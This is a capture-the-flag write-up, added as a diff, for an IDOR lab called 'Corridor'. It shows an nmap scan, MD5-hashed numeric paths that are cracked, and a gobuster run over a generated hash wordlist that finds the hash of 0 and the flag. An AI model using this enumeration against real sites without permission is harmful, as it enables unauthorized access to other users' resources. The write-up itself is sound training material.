@@ -1,0 +1,63 @@
+You have found yourself in a strange corridor. Can you find your way back to where you came?
+
+In this challenge, you will explore potential IDOR vulnerabilities. Examine the URL endpoints you access as you navigate the website and note the hexadecimal values you find (they look an awful lot like a hash, don't they?). This could help you uncover website locations you were not expected to access.
+
+nmap scan
+
+nmap -sC -sV $IP
+Host is up (0.27s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.2)
+|_http-title: Corridor
+
+we find only one open port(80) running Werkzeug httpd 2.0.3.
+
+Web
+
+Checking the source code of the web page we find href links with hashed values. Cracking the hashes at crackstation we see the create a sequence of 1,2,3 until 13. Visiting all of them redirect us to an empty page.
+
+We can try an see beyond those numbers to check for any other "doors" that we can find.
+
+i created a hashes.py script to generate as much hashes as i wanted from 0 to n so i did not have to do it manually.
+
+the results were saved to a "hashes.txt" file.
+
+running gobuster to check if we get any different result.
+
+gobuster dir -u http://$IP -w /home/user/tHM/corridor/hashes.txt 
+
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.123.63
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/julian/tHM/corridor/hashes.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/10/02 02:15:45 Starting gobuster in directory enumeration mode
+===============================================================
+/eccbc87e4b5ce2fe28308fd9f2a7baf3 (Status: 200) [Size: 632]
+/c81e728d9d4c2f636f067f89cc14862c (Status: 200) [Size: 632]
+/1679091c5a880faf6fb5e6087eb1b2dc (Status: 200) [Size: 632]
+/c4ca4238a0b923820dcc509a6f75849b (Status: 200) [Size: 632]
+/c9f0f895fb98ab9159f51fd0297e236d (Status: 200) [Size: 632]
+/8f14e45fceea167a5a36dedd4bea2543 (Status: 200) [Size: 632]
+/a87ff679a2f3e71d9181a67b7542122c (Status: 200) [Size: 632]
+/e4da3b7fbbce2345d7772b0674a318d5 (Status: 200) [Size: 632]
+/cfcd208495d565ef66e7dff9f98764da (Status: 200) [Size: 797]
+/45c48cce2e2d7fbdea1afc51c7c6ad26 (Status: 200) [Size: 632]
+/6512bd43d9caa6e02c990b0a82652dca (Status: 200) [Size: 632]
+/d3d9446802a44259755d38e6d163e820 (Status: 200) [Size: 632]
+/c51ce410c124a10e0db5e4b97fc2af39 (Status: 200) [Size: 632]
+/c20ad4d76fe97759aa27a0c99bff6710 (Status: 200) [Size: 632]
+                                                           
+===============================================================
+2022/10/02 02:16:00 Finished
+===============================================================
+
+We got a hit with different size, trying that hash we get our flag.
+
